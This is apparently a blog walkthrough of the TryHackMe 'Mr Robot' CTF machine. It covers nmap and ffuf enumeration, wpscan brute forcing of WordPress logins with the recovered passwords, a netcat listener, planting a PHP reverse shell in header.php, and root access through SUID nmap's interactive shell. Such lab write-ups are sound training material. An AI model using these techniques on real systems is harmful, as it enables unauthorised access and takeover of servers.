---
title: "Writeup for Mr Robot CTF on THM"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/mr_robot.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "TryHackMe Mr Robot CTF is inspired by the popular TV series, this machine offers a thrilling challenge that will test your skills in web exploitation, privilege escalation, and more. I'll take you step-by-step through the process of hacking into the Mr Robot machine, uncovering hidden vulnerabilities, and ultimately capturing the flags."
description: "Walkthrough on Mr Robot CTF machine from TryHackMe"
categories:
  - writeups
tags:
  - mrrobot
  - THM
  - CTF
  - privesc
  - witeup
  - TryHackMe
toc: false
---
# Mr Robot CTF

## Information gathering

### Enumeration

#### nmap

Command:
```sh
nmap -sC -sV [machineIp]
```

Results:
```sh
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

```
#### ffuf

Command:
```sh
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://[machineIp]/FUZZ 
```

Results:
```sh
.htpasswd               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 57ms]
.hta                    [Status: 403, Size: 213, Words: 16, Lines: 10, Duration: 61ms]
.htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 61ms]
                        [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 90ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 783ms]
admin                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 51ms]
audio                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 52ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 767ms]
blog                    [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 51ms]
css                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 51ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 831ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 830ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 834ms]
images                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 51ms]
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 866ms]
index.html              [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 70ms]
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 893ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 833ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 59ms]
js                      [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 54ms]
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 79ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 808ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 788ms]
phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 59ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 53ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 816ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 60ms]
robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 52ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 798ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 791ms]
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
sitemap.xml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
video                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 57ms]
wp-admin                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 53ms]
wp-content              [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 57ms]
wp-includes             [Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 53ms]
wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 858ms]
wp-cron                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 867ms]
wp-links-opml           [Status: 200, Size: 227, Words: 13, Lines: 11, Duration: 852ms]
wp-load                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 829ms]
wp-login                [Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 873ms]
wp-settings             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 777ms]
wp-mail                 [Status: 500, Size: 3064, Words: 212, Lines: 110, Duration: 951ms]
wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 816ms]
xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 898ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 837ms]
:: Progress: [4614/4614] :: Job [1/1] :: 27 req/sec :: Duration: [0:02:38] :: Errors: 0 ::
```

## Exploitation

### Foothold
1. Check content of robots.txt file found in file enumeration
2. In the robots there is a file called http://[machineIp]/key-1-of-3.txt containing **Key1** (FIRST KEY IN THE CTF)
3. Also, in location http://[machineIp]/fsocity.dic is a dictionary, download it locally for later
4. Check the installed wordpress instance using wpscan:
```sh
wpscan --url http://[machineIp]/0/ --wp-content-dir wp-content -e vp,vt,cb,u,dbe,m
```
5. Scanning the wordpress we found two users: **elliot**, **mich05654**
6. Brute force with wpscan for user **mich05654**:
```sh
wpscan --url http://[machineIp]/0/ --wp-content-dir wp-content -U mich05654 -P /home/kali/Downloads/fsocity.dic 
```
7. Found password for mich05654: *Dylan_2791*
8. Login with found user and password on the http://[machineIp]/wp-login.php
9. This user has limited access in wordpress
10. Since bruteforcing with wpscan is realy slow we can use BurpSuite or Hydra to bruteforce for user *elliot*
11. Check for dictionary downloaded; a lot of lines are repeating - clean the dictionary first
12. Checking the dictionary again I saw that a couple of more than 11k passwords are repeating except last few lines:
```txt
ER28-0652
psychedelic
iamalearn
uHack
imhack
abcdefghijklmno
abcdEfghijklmnop
abcdefghijklmnopq
c3fcd3d76192e4007dfb496cca67e13b
ABCDEFGHIJKLMNOPQRSTUVWXYZ
```
13. Bruteforcing with this small list I found elliot's password: *ER28-0652*
14. Start a local listener with netcat `nc -lvnp 4455`
15. Login with elliot on wordpress and edit theme (Apearance >> Editor) replace the content of file (header.php) with a php rev shell (PentestMonkey.php)
16. Re-visit blog to load the content of header.php, the reverse shell should run

#### Data exfiltration
1. We are logged as user "daemon" on Linux machine and the second flag is own by user "robot", for this a lateral movement will be needed
2. Check for SUID `find / -perm /4000 2> /dev/null`
3. Found nmap instance with SUID set `-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap`

### Privilege escalation
1. Check https://gtfobins.github.io/gtfobins/nmap/ for how you can spawn a shell using nmap:
```sh
nmap --interactive
nmap> !sh
```
2. Voila! You are root :)

#### Data exfiltration
1. Read content of /home/robot/key-2-of-3.txt for **Key2** (SECOND KEY IN THE CTF)
2. Read content of /root/key-3-of-3.txt for **Key3** (THIRD KEY IN THE CTF)